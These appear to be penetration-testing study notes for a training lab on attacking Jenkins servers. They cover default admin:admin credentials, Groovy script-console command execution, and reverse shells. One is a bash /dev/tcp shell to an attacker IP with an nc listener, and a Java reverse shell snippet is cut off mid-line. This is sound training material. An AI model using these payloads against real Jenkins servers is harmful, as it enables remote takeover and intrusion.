# Jenkins Attacks

* Jenkins runs on Tomcat port 8080 by default.
  * It also utilizes port 5000 to attach slave servers.
    * This port is used to communicate between masters and slaves
* Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all
  * Administrators can also allow or disallow users from creating accounts.
  * default credentials
    * `admin:admin`

### Script Console

* The script console can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`
  * This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache\_Groovy) scripts, which are an object-oriented Java-compatible language
  * For example, we can use the following snippet to run the `id` command.

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```
http://jenkins.inlanefreight.local:8000/script
```

* There are various ways that access to the script console can be leveraged to gain a reverse shell.
  * For example, using the command below, or [this](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins\_script\_console/) Metasploit module.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```shell-session
nc -lvnp 8443
```

* Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
* We could run commands on a Windows-based Jenkins install using this snippet:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}")
```

* We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(h
```
